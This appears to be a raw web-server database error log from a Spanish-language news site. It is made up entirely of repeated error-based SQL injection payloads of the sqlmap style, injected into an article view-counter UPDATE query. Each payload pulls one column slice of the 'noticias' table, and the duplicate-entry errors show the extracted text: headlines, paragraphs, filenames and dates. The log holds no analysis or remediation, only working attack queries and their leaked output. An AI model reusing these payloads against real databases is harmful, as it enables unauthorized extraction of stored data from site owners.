+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1017 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:29
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchihuahua3qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2210 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqLa secretaria de SEDATU la maestra Rosario Robles y elqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7624 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqLa máxima figura política y religiosa del país apoyó aq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9659 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6920 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnacionalqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7533 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqunicipalesqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2370 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3319 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2938 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7890 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+El líder supremo iraní, Alí Jamenei, saludó hoy comoq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3530 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9262 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqDesigna IEE a las y los integrantes de las asambleas mqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1002 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3231 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1591 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq
+Miguel Ruiz Cabañas, dijo que la aprehensión de Guzmqjz' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5319 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4579 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2016-01-09 11:31:03qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9818 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(`date` AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 299,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9223 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmundo1qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2381 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3666 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6716 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4125 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq256qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3338 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(visitas AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmuertos en 21 mesesqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1276 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 6507 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7046 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7906 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3594 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7885 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(videotype AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqAcusa ONU a ISIS de genocidio en Irak; reporta 19 mil qjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5967 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5875 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5256 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqCEDPAR.jpgqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3806 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7406 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2183 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(video AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9624 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqofesionista, 22 técnicos en estudios superiores,
+223 qjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3325 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),595,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq3031qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2018 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 1282 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo5 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqirannnn.jpgqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2772 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchihuahua4qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 4869 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ubicacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:26
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8127 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen2 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqtorado, 54 una maestrías, 338 con diferente carrera prqjzj' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8916 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),541,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqestadoqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 5858 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8126 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo4 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq3030qjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3582 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(id AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqchapoooo.jpgqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3863 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(imagen AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 298,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqperaturasqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 9514 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(titulo AS CHAR),0x20)),55,54) FROM delbd.noticias ORDER BY id LIMIT 297,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 8062 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(ciudad AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 498,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqnas entrevistadas, 4 informaron haber estudiado un docqjzjq' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 2805 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo2 AS CHAR),0x20)),487,54) FROM delbd.noticias ORDER BY id LIMIT 296,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 3768 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(parrafo3 AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 496,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxqmundoqjzjq1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=11415 AND (SELECT 7008 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT MID((IFNULL(CAST(clasificacion AS CHAR),0x20)),1,54) FROM delbd.noticias ORDER BY id LIMIT 497,1),0x716a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+Time : 20:15:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'qqzxq2830qjzjq1' for key 'group_key'
